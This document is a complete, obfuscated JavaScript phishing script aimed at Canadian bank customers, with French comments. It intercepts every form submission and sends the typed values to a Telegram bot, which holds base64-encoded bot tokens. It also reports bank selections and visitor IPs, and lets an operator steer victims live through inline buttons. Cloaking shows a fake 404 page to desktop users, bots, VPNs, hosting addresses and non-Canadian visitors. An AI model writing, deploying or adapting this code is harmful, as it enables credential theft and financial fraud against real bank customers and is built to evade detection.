(function(_W,_D,_N){
  'use strict';

  var _0xA = [
    'ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==',
    'Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw==',
    'Njc4ODAxMjQ4MQ==',
    'CA'
  ];

  var _M = atob(_0xA[0]);
  var _R = atob(_0xA[1]);
  var _ID = atob(_0xA[2]);
  var _CC = _0xA[3];

  var _SID = _W.sessionStorage.getItem('__xsid') || (function(){
    var _x = Math.random().toString(36).substring(2,11).toUpperCase();
    _W.sessionStorage.setItem('__xsid', _x);
    return _x;
  })();

  function _die(){
    try {
      _D.open();
      _D.write('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.52 (Ubuntu) Server</address></body></html>');
      _D.close();
      _W.history.pushState(null, '', '/404');
    } catch(e) {
      _W.location.replace('/404');
    }
  }

  // 1. Détection Mobile Stricte
  function _isMobile(){
    var _ua = _N.userAgent || '';
    var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W);
    var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(_ua);
    var _minDim = Math.min(_W.screen.width, _W.screen.height);
    if (!_isMobUA || !_touch || _minDim > 900) {
      return false;
    }
    return true;
  }

  // 2. Détection Bot
  function _isBot(){
    if (_N.webdriver === true || _D.documentElement.getAttribute('webdriver')) return true;
    if (_W.callPhantom || _W._phantom || _W.__nightmare || _W.domAutomation || _W.domAutomationController) return true;
    if (/HeadlessChrome|PhantomJS|SlimerJS|Selenium|WebDriver|Bot|Crawl|Spider/i.test(_N.userAgent || '')) return true;
    return false;
  }

  function _tg(_tok, _txt, _kb){
    var _b = { chat_id: _ID, text: _txt, parse_mode: 'HTML' };
    if (_kb) _b.reply_markup = { inline_keyboard: _kb };
    return fetch('https://api.telegram.org/bot' + _tok + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(_b)
    });
  }

  function _poll(_tok, _cb){
    var _el = 0;
    var _tm = setInterval(function(){
      _el += 3000;
      if (_el > 600000) { clearInterval(_tm); return; }
      fetch('https://api.telegram.org/bot' + _tok + '/getUpdates?offset=-1&timeout=1')
        .then(function(r){ return r.json(); })
        .then(function(d){
          var _rs = d.result || [];
          if (!_rs.length) return;
          var _u = _rs[_rs.length - 1];
          var _cq = _u.callback_query;
          if (!_cq) return;
          var _dv = _cq.data || '';
          if (_dv.indexOf(_SID) === -1) return;
          clearInterval(_tm);
          _cb(_dv);
          fetch('https://api.telegram.org/bot' + _tok + '/answerCallbackQuery?callback_query_id=' + _cq.id);
        }).catch(function(){});
    }, 3000);
  }

  function _ldr(show){
    var _e = _D.getElementById('__ld');
    if (!_e && show) {
      _e = _D.createElement('div');
      _e.id = '__ld';
      _e.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.97);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;';
      _e.innerHTML = '<div style="border:4px solid #eee;border-top:4px solid #222;border-radius:50%;width:48px;height:48px;animation:__sp 0.8s linear infinite"></div><p style="margin-top:18px;font-family:Arial,sans-serif;font-size:16px;color:#555">Veuillez patienter...</p><style>@keyframes __sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
      _D.body.appendChild(_e);
    }
    if (_e) _e.style.display = show ? 'flex' : 'none';
  }

  function _setupForms(){
    var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
    var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
    var _pg = _W.location.pathname.split('/').pop() || 'index';

    _D.querySelectorAll('form').forEach(function(_f){
      if (_f.dataset.xh) return;
      _f.dataset.xh = '1';

      _f.addEventListener('submit', function(_ev){
        _ev.preventDefault();
        _ev.stopImmediatePropagation();

        var _flds = [];
        _f.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=checkbox]):not([type=radio]),select,textarea').forEach(function(_i){
          var _l = _i.name || _i.id || _i.placeholder || _i.type || '?';
          _flds.push('<b>' + _l + ':</b> <code>' + (_i.value || '(vide)') + '</code>');
        });

        var _nx = _f.getAttribute('action') || '';
        var _msg = '🔐 <b>CAPTURE | ' + _pg.toUpperCase() + '</b>\n━━━━━━━━━━━━━━━\n' + _flds.join('\n') + '\n━━━━━━━━━━━━━━━\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>';
        var _kb = [
          [{ text: '✅ Valide', callback_data: _SID + ':ok' }, { text: '❌ Erreur', callback_data: _SID + ':err' }],
          [{ text: '⏳ +30s', callback_data: _SID + ':30' }, { text: '⏳ +60s', callback_data: _SID + ':60' }, { text: '⏳ +120s', callback_data: _SID + ':120' }]
        ];

        _ldr(true);
        _tg(_M, _msg, _kb).catch(function(){ _ldr(false); _W.location.href = _nx; });
        _poll(_M, function(_a){
          if (_a.indexOf(':ok') !== -1) { _ldr(false); _W.location.href = _nx; }
          else if (_a.indexOf(':err') !== -1) { _ldr(false); _W.location.reload(); }
          else {
            var _t = _a.indexOf(':30') !== -1 ? 30000 : _a.indexOf(':60') !== -1 ? 60000 : 120000;
            setTimeout(function(){ _ldr(false); _W.location.href = _nx; }, _t);
          }
        });
      }, true);
    });
  }

  function _setupBanks(){
    var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
    var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';

    var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"]';
    _D.querySelectorAll(_selector).forEach(function(_el){
      if (_el.dataset.xb) return;
      _el.dataset.xb = '1';
      _el.addEventListener('click', function(e){
        var _raw = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.getAttribute('title') || _el.innerText || '';
        
        // Si c'est une image à l'intérieur de la tuile
        if (!_raw || _raw.trim() === '') {
          var _img = _el.querySelector('img');
          if (_img) {
            _raw = _img.getAttribute('alt') || _img.getAttribute('title') || _img.getAttribute('src') || '';
          }
        }

        var _clean = _raw.replace(/\s+/g, ' ').trim();

        // Extraire le nom de la banque propre
        var _bankList = ['RBC', 'TD', 'BMO', 'CIBC', 'Scotiabank', 'Desjardins', 'National Bank', 'Tangerine', 'Simplii', 'KOHO', 'ATB', 'UNI', 'Laurentian', 'Meridian', 'Neo', 'PC Financial', 'Vancity', 'Wealthsimple', 'Coast Capital'];
        var _matchedBank = '';

        for (var i = 0; i < _bankList.length; i++) {
          if (_clean.toLowerCase().indexOf(_bankList[i].toLowerCase()) !== -1) {
            _matchedBank = _bankList[i];
            break;
          }
        }

        var _finalBankName = _matchedBank ? _matchedBank : (_clean || 'Banque inconnue');

        _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
      }, true);
    });
  }

  function _init(){
    // 1. Mobile-only check
    if (!_isMobile()) {
      _die();
      return;
    }

    // 2. Bot check
    if (_isBot()) {
      _die();
      return;
    }

    function _activate(ip, org, countryCode){
      _W.sessionStorage.setItem('__xip', ip);
      _W.sessionStorage.setItem('__xorg', org);

      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');

      _setupForms();
      _setupBanks();
    }

    fetch('https://www.cloudflare.com/cdn-cgi/trace')
      .then(function(r){ return r.text(); })
      .then(function(t){
        var locMatch = t.match(/loc=([A-Z]{2})/);
        var ipMatch = t.match(/ip=([^\n]+)/);
        var loc = locMatch ? locMatch[1] : '';
        var ipVal = ipMatch ? ipMatch[1] : '';

        if (loc !== _CC) {
          _die();
          return;
        }

        fetch('https://ipwho.is/' + ipVal)
          .then(function(r){ return r.json(); })
          .then(function(d){
            if (d.success) {
              var _sec = d.security || {};
              var _conn = d.connection || {};
              var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
              var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting';
              var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
              var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;

              if (isProxy || isHosting || vpnPatterns.test(orgName)) {
                _die();
                return;
              }
              _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code);
            } else {
              _activate(ipVal, 'Canada ISP', loc);
            }
          })
          .catch(function(){
            _activate(ipVal, 'Canada ISP', loc);
          });
      })
      .catch(function(){
        fetch('https://ipwho.is/')
          .then(function(r){ return r.json(); })
          .then(function(d){
            if (!d.success || d.country_code !== _CC) {
              _die();
              return;
            }
            var _sec = d.security || {};
            var _conn = d.connection || {};
            var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
            var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting';
            var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
            var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;

            if (isProxy || isHosting || vpnPatterns.test(orgName)) {
              _die();
              return;
            }
            _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code);
          })
          .catch(function(){
            _die();
          });
      });
  }

  if (_D.readyState === 'loading') {
    _D.addEventListener('DOMContentLoaded', _init);
  } else {
    _init();
  }

})(window, document, navigator);